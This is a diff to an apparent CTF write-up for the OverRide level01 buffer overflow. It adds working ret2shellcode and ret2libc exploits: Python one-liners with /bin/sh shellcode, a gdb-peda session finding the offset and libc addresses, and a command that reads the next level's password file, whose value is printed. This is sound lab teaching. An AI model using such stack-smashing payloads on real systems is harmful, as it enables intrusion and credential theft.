@@ -162,9 +162,86 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 Program exit on `EIP` value 0x37634136 which gives offset of 80 bytes.
 
+## ret2shellcode
 As `a_user_name` is defined with 100 bytes, a shell code can be placed after `dat_wil` and EIP overwritten to `a_user_name+7`.
 ```shell
 level01@OverRide:~$ (python -c "import struct; print('dat_wil\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\n' + 'A'*80 + struct.pack('I', 0x0804a047))"; echo 'cat /home/users/$(whoami)/.pass') | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
+## ret2libc
+```gdb
+gdb-peda$ break *main+164
+Breakpoint 1 at 0x8048574
+gdb-peda$ run
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd6bc --> 0x0
+EBX: 0xffffd6bc --> 0x0
+ECX: 0xffffffff
+EDX: 0xf7fd08b8 --> 0x0
+ESI: 0x0
+EDI: 0xffffd6fc --> 0x0
+EBP: 0xffffd708 --> 0x0
+ESP: 0xffffd6a0 --> 0xffffd6bc --> 0x0
+EIP: 0x8048574 (<main+164>:     call   0x8048370 <fgets@plt>)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+0x8048565 <main+149>:        mov    DWORD PTR [esp+0x4],0x64
+0x804856d <main+157>:        lea    eax,[esp+0x1c]
+0x8048571 <main+161>:        mov    DWORD PTR [esp],eax
+=> 0x8048574 <main+164>:     call   0x8048370 <fgets@plt>
+0x8048579 <main+169>:        lea    eax,[esp+0x1c]
+0x804857d <main+173>:        mov    DWORD PTR [esp],eax
+0x8048580 <main+176>:        call   0x80484a3 <verify_user_pass>
+0x8048585 <main+181>:        mov    DWORD PTR [esp+0x5c],eax
+Guessed arguments:
+arg[0]: 0xffffd6bc --> 0x0
+arg[1]: 0x64 ('d')
+arg[2]: 0xf7fcfac0 --> 0xfbad2288
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd6a0 --> 0xffffd6bc --> 0x0
+0004| 0xffffd6a4 --> 0x64 ('d')
+0008| 0xffffd6a8 --> 0xf7fcfac0 --> 0xfbad2288
+0012| 0xffffd6ac --> 0x1
+0016| 0xffffd6b0 --> 0xffffd8cb ("/home/users/level01/level01")
+0020| 0xffffd6b4 --> 0x2f ('/')
+0024| 0xffffd6b8 --> 0xffffd70c --> 0xf7e45513 (<__libc_start_main+243>:        mov    DWORD PTR [esp],eax)
+0028| 0xffffd6bc --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x08048574 in main ()
+gdb-peda$ info frame
+Stack level 0, frame at 0xffffd710:
+eip = 0x8048574 in main; saved eip 0xf7e45513
+called by frame at 0xffffd780
+Arglist at 0xffffd708, args:
+Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+Saved registers:
+ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c
+gdb-peda$ p/d 0xffffd70c-0xffffd6bc
+$1 = 80
+gdb-peda$ print system
+$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+gdb-peda$ print exit
+$3 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xf7f897ec ("/bin/sh")
+```
+```shell
+level01@OverRide:~$ (python -c "import struct; print('dat_wil\n' + 'A'*80 + struct.pack('I', 0xf7e6aed0) + struct.pack('I', 0xf7e5eb70) + struct.pack('I', 0xf7f897ec))"; echo 'cat /home/users/$(whoami)/.pass') | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
